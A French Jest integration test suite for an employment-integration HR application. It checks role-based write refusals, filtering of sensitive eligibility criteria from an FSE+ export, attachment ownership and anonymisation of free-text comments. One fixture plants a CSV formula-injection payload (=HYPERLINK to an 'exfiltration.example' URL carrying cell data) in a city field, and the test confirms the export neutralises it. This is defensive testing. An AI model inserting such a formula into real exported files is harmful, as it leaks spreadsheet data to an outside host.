// ═══════════════════════════════════════════════════════════════════════════
// PR A — CORRECTIFS DE SÉCURITÉ SUR POSTGRESQL RÉEL (13/09).
//
// Les suites de `tests/securite-pr-a/` exercent les vrais handlers sur un `pg`
// SIMULÉ : elles prouvent qu'une donnée ne part pas dans la réponse HTTP, mais
// pas ce qui se passe réellement en base. Celle-ci ferme l'écart sur les
// constats dont l'effet est une ÉCRITURE (ou son absence) :
//
//   C-02 / M-01  le questionnaire FSE+ et ses suggestions ne sortent pas,
//                et un MANAGER ne peut pas les écrire ;
//   M-02         un MANAGER ne crée AUCUNE ligne `insertion_fse_sorties` ;
//   M-03         l'anonymisation retire le commentaire libre et conserve les
//                réponses typées ;
//   M-04         une commune piégée sort neutralisée du fichier transmis ;
//   m-06         une pièce ne se rattache pas à l'entretien d'un autre.
// ═══════════════════════════════════════════════════════════════════════════
'use strict';

const { RUN, creerComptes, purger, creerSalarie, jourDecale } = require('./_helpers');

jest.mock('../../src/middleware/activity-logger', () => ({
  autoLogActivity: () => (req, res, next) => next(),
  logActivity: () => {},
}));

const express = require('express');
const request = require('supertest');
const pool = require('../../src/config/database');

const app = express();
app.use(express.json());
app.use('/api/insertion', require('../../src/routes/insertion'));
app.use('/api/exports', require('../../src/routes/exports-fse'));

jest.setTimeout(60000);

const PREFIXE = 'jest_prA_secu';
const MAT = ['PRASECU1', 'PRASECU2'];
let U; let salarie; let autre; let projetId;

const auth = (r, role) => r.set('Authorization', `Bearer ${U[role].token}`);

(RUN ? describe : describe.skip)('PR A — correctifs de sécurité (PostgreSQL réel)', () => {
  beforeAll(async () => {
    await purger(pool, { matricules: MAT, usernamePrefix: PREFIXE, projetCodes: ['ASI-SECU-JEST'] });
    U = await creerComptes(pool, PREFIXE);
    salarie = await creerSalarie(pool, MAT[0], {
      first_name: 'Amel', last_name: 'Durand', insertion_status: 'en_parcours',
      insertion_start_date: jourDecale(-200), contract_end: jourDecale(30),
      // Commune PIÉGÉE : c'est un champ libre importé de la paie.
      city: '=HYPERLINK("http://exfiltration.example/?d="&A2&B2,"Cliquez ici")',
      birth_date: '1988-04-12', gender: 'F', brsa: true, france_travail_id: '7612345A',
    });
    autre = await creerSalarie(pool, MAT[1], { first_name: 'Karim', last_name: 'Benali' });
    const p = await pool.query(
      `INSERT INTO insertion_projets (code, nom, type, financeur, date_debut, date_fin, actif)
       VALUES ('ASI-SECU-JEST', 'Opération de preuve', 'asi', 'FSE+', $1, $2, true) RETURNING id`,
      [jourDecale(-365), jourDecale(365)]
    );
    projetId = p.rows[0].id;
    await pool.query(
      `INSERT INTO insertion_projet_participants (projet_id, employee_id, date_entree) VALUES ($1, $2, $3)`,
      [projetId, salarie, jourDecale(-180)]
    );
  });

  afterAll(async () => {
    await purger(pool, { matricules: MAT, employeeIds: [salarie, autre], usernamePrefix: PREFIXE, projetCodes: ['ASI-SECU-JEST'] });
    await pool.end();
  });

  // ── C-02 / M-01 ──────────────────────────────────────────────────────────
  describe('C-02 / M-01 — questionnaire FSE+ et suggestions', () => {
    test("l'ADMIN écrit le questionnaire, commentaire libre compris", async () => {
      const r = await auth(request(app).put(`/api/insertion/diagnostic/${salarie}`), 'ADMIN').send({
        fse_entree: {
          statut_avant_entree: 'demandeur_emploi', duree_sans_emploi: '12_24m',
          foyer_monoparental: true, sans_domicile_stable: false, ressources_principales: 'rsa',
          commentaire: 'Hospitalisation en psychiatrie en mars ; sursis probatoire jusqu’en 2027.',
        },
      });
      expect(r.status).toBe(200);
      const v = await pool.query('SELECT fse_entree FROM insertion_diagnostics WHERE employee_id = $1', [salarie]);
      expect(v.rows[0].fse_entree.commentaire).toContain('psychiatrie');
      // Les suggestions dérivées des statuts lui sont bien servies, à LUI.
      expect(r.body.suggestions_fse.ressources_principales.valeur).toBe('rsa');
    });

    test('le MANAGER ne reçoit ni le questionnaire, ni sa complétude, ni les suggestions', async () => {
      const r = await auth(request(app).get(`/api/insertion/diagnostic/${salarie}`), 'MANAGER');
      expect(r.status).toBe(200);
      expect(Object.keys(r.body)).not.toContain('fse_entree');
      expect(Object.keys(r.body)).not.toContain('fse_entree_complet');
      expect(r.body.suggestions_fse).toEqual({});
      expect(r.body.fse_completude).toBeNull();
      const brut = JSON.stringify(r.body);
      expect(brut).not.toContain('psychiatrie');
      expect(brut).not.toContain('bénéficiaire du RSA');
    });

    test("le MANAGER ne peut pas écrire le questionnaire, et rien n'est modifié en base", async () => {
      const avant = await pool.query('SELECT fse_entree FROM insertion_diagnostics WHERE employee_id = $1', [salarie]);
      const r = await auth(request(app).put(`/api/insertion/diagnostic/${salarie}`), 'MANAGER')
        .send({ fse_entree: { foyer_monoparental: false, commentaire: 'écrit par un encadrant' } });
      expect(r.status).toBe(403);
      expect(r.body.code).toBe('FSE_ADMIN_RH_STRICT');
      const apres = await pool.query('SELECT fse_entree FROM insertion_diagnostics WHERE employee_id = $1', [salarie]);
      expect(apres.rows[0].fse_entree).toEqual(avant.rows[0].fse_entree);
    });
  });

  // ── C-03 ─────────────────────────────────────────────────────────────────
  describe('C-03 — alerte « référent non déterminé »', () => {
    test('servie à ADMIN sans nommer le statut, absente pour le MANAGER', async () => {
      const a = await auth(request(app).get(`/api/insertion/alertes/${salarie}`), 'ADMIN');
      const liste = a.body.alertes || a.body;
      const alerte = liste.find((x) => x.type === 'referent_non_determine');
      expect(alerte).toBeDefined();
      expect(alerte.message).not.toMatch(/RSA/);
      const m = await auth(request(app).get(`/api/insertion/alertes/${salarie}`), 'MANAGER');
      expect(m.status).toBe(200);
      expect(JSON.stringify(m.body)).not.toContain('referent_non_determine');
      expect(JSON.stringify(m.body)).not.toMatch(/bénéficiaire du RSA/);
    });
  });

  // ── M-02 ─────────────────────────────────────────────────────────────────
  describe('M-02 — clôture d’un bilan de sortie', () => {
    let jalonId;
    beforeAll(async () => {
      const r = await pool.query(
        `INSERT INTO insertion_milestones (employee_id, milestone_type, titre, due_date, status, parcours_num,
                                           sortie_classification, sortie_type)
         VALUES ($1, 'bilan_sortie', 'Bilan de sortie', $2, 'planifie', 1, 'emploi_durable', 'cdi') RETURNING id`,
        [salarie, jourDecale(-1)]
      );
      jalonId = r.rows[0].id;
    });

    test("le MANAGER est refusé et n'écrit AUCUNE ligne de sortie FSE+", async () => {
      const avant = await pool.query('SELECT count(*)::int n FROM insertion_fse_sorties WHERE employee_id = $1', [salarie]);
      const r = await auth(request(app).post(`/api/insertion/milestones/${jalonId}/close`), 'MANAGER').send({});
      expect(r.status).toBe(403);
      expect(r.body.code).toBe('BILAN_SORTIE_ADMIN_RH');
      const apres = await pool.query('SELECT count(*)::int n FROM insertion_fse_sorties WHERE employee_id = $1', [salarie]);
      expect(apres.rows[0].n).toBe(avant.rows[0].n);
      // Et le jalon n'est ni clôturé ni verrouillé.
      const j = await pool.query('SELECT status, locked_at FROM insertion_milestones WHERE id = $1', [jalonId]);
      expect(j.rows[0].status).toBe('planifie');
      expect(j.rows[0].locked_at).toBeNull();
    });
  });

  // ── M-04 / M-06 ──────────────────────────────────────────────────────────
  describe('M-04 / M-06 — le fichier transmis à l’autorité', () => {
    beforeAll(async () => {
      // Deux critères réellement constatés, dont un marqué art. 10 dans le
      // référentiel. C'est la seule façon d'éprouver le filtre : le faux `pg`
      // des suites de contrat rend la colonne agrégée quoi qu'il arrive, il ne
      // peut pas voir un JOIN ni un prédicat.
      for (const code of ['brsa', 'sortant_detention']) {
        await pool.query(
          `INSERT INTO employee_eligibilite (employee_id, critere_code, date_constat)
           VALUES ($1, $2, CURRENT_DATE) ON CONFLICT (employee_id, critere_code) DO NOTHING`,
          [salarie, code]
        );
      }
      const v = await pool.query(
        "SELECT sensible_art10 FROM insertion_eligibilite_criteres WHERE code = 'sortant_detention'"
      );
      expect(v.rows[0].sensible_art10).toBe(true); // sinon la preuve ne prouve rien
    });

    test('M-06 — le critère art. 10 ne figure PAS en colonne 10, les autres si', async () => {
      const r = await auth(
        request(app).get(`/api/exports/fse-plus?projet=${projetId}&annee=${new Date().getFullYear()}&trimestre=${Math.floor(new Date().getMonth() / 3) + 1}`),
        'RH'
      );
      if (r.status === 409) { expect(r.body.code).toBe('EXPORT_VIDE'); return; }
      expect(r.status).toBe(200);
      const lignes = r.text.replace(/^\ufeff/, '').split('\n').filter((l) => l && !l.startsWith('#'));
      const cellules = lignes[1].split(';');
      // Colonne 10 « Critères d'éligibilité IAE » — indice 9.
      expect(cellules[9]).toContain('brsa');
      expect(cellules[9]).not.toContain('sortant_detention');
      // Et nulle part ailleurs dans le fichier.
      expect(r.text).not.toContain('sortant_detention');
    });

    test('la commune piégée sort NEUTRALISÉE, et l’en-tête porte « Prénom Nom »', async () => {
      const r = await auth(
        request(app).get(`/api/exports/fse-plus?projet=${projetId}&annee=${new Date().getFullYear()}&trimestre=${Math.floor(new Date().getMonth() / 3) + 1}`),
        'RH'
      );
      // Selon le trimestre courant, la période peut ne contenir personne : on
      // ne teste alors que ce qui est testable, sans inventer un succès.
      if (r.status === 409) { expect(r.body.code).toBe('EXPORT_VIDE'); return; }
      expect(r.status).toBe(200);
      expect(r.text).toContain("'=HYPERLINK(");
      expect(r.text).not.toMatch(/(^|;)=HYPERLINK\(/m);
      expect(r.text).toMatch(/Généré par;Jest RH/);
      expect(r.text).not.toMatch(/Généré par;jest_prA_secu/);
    });
  });

  // ── m-06 ─────────────────────────────────────────────────────────────────
  describe('m-06 — rattachement d’une pièce', () => {
    test("l'entretien d'un AUTRE salarié est refusé (la FK, elle, l'accepterait)", async () => {
      const j = await pool.query(
        `INSERT INTO insertion_milestones (employee_id, milestone_type, titre, due_date, status, parcours_num)
         VALUES ($1, 'bilan_intermediaire', 'Bilan', $2, 'planifie', 1) RETURNING id`,
        [autre, jourDecale(-5)]
      );
      const r = await auth(request(app).post(`/api/insertion/pieces/${salarie}`), 'ADMIN')
        .field('type', 'entretien_signe')
        .field('milestone_id', String(j.rows[0].id))
        .attach('fichier', Buffer.from('%PDF-1.4 preuve'), 'entretien.pdf');
      expect(r.status).toBe(400);
      expect(r.body.code).toBe('RATTACHEMENT_HORS_SALARIE');
      const n = await pool.query('SELECT count(*)::int n FROM insertion_pieces WHERE employee_id = $1', [salarie]);
      expect(n.rows[0].n).toBe(0);
    });

    test("le sien est accepté", async () => {
      const j = await pool.query(
        `INSERT INTO insertion_milestones (employee_id, milestone_type, titre, due_date, status, parcours_num)
         VALUES ($1, 'bilan_intermediaire', 'Bilan', $2, 'planifie', 1) RETURNING id`,
        [salarie, jourDecale(-5)]
      );
      const r = await auth(request(app).post(`/api/insertion/pieces/${salarie}`), 'ADMIN')
        .field('type', 'entretien_signe')
        .field('milestone_id', String(j.rows[0].id))
        .attach('fichier', Buffer.from('%PDF-1.4 preuve'), 'entretien.pdf');
      expect(r.status).toBe(201);
    });
  });

  // ── M-03 ─────────────────────────────────────────────────────────────────
  describe('M-03 — anonymisation du commentaire libre', () => {
    test('le commentaire disparaît, les réponses TYPÉES restent', async () => {
      // Une sortie FSE+ avec son propre commentaire, pour couvrir les deux JSONB.
      await pool.query(
        `INSERT INTO insertion_fse_sorties (employee_id, parcours_num, projet_id, source, date_sortie, situation_sortie, fse_sortie, saisie_par)
         VALUES ($1, 1, $2, 'sans_bilan', $3, 'emploi_durable', $4::jsonb, $5)
         ON CONFLICT (employee_id, parcours_num) DO UPDATE SET fse_sortie = EXCLUDED.fse_sortie`,
        [salarie, projetId, jourDecale(-2),
          JSON.stringify({ situation_sortie: 'emploi_durable', type_contrat: 'cdi', commentaire: 'a repris un traitement' }),
          U.ADMIN.id]
      );

      const { anonymizeEmployee } = require('../../src/services/anonymization');
      const client = await pool.connect();
      try {
        await client.query('BEGIN');
        await anonymizeEmployee(client, salarie);
        await client.query('COMMIT');
      } finally { client.release(); }

      const d = await pool.query('SELECT fse_entree FROM insertion_diagnostics WHERE employee_id = $1', [salarie]);
      expect(d.rows[0].fse_entree.commentaire).toBeUndefined();
      // Les réponses typées — la piste d'audit — sont intactes.
      expect(d.rows[0].fse_entree.ressources_principales).toBe('rsa');
      expect(d.rows[0].fse_entree.foyer_monoparental).toBe(true);

      const s = await pool.query('SELECT fse_sortie, situation_sortie FROM insertion_fse_sorties WHERE employee_id = $1', [salarie]);
      expect(s.rows).toHaveLength(1); // la LIGNE survit : c'est la piste d'audit
      expect(s.rows[0].fse_sortie.commentaire).toBeUndefined();
      expect(s.rows[0].fse_sortie.type_contrat).toBe('cdi');
      expect(s.rows[0].situation_sortie).toBe('emploi_durable');

      // Et le dossier administratif est bien purgé (non-régression du lot 1).
      const e = await pool.query('SELECT count(*)::int n FROM employee_eligibilite WHERE employee_id = $1', [salarie]);
      expect(e.rows[0].n).toBe(0);
      const p = await pool.query('SELECT count(*)::int n FROM insertion_pieces WHERE employee_id = $1', [salarie]);
      expect(p.rows[0].n).toBe(0);
    });
  });
});
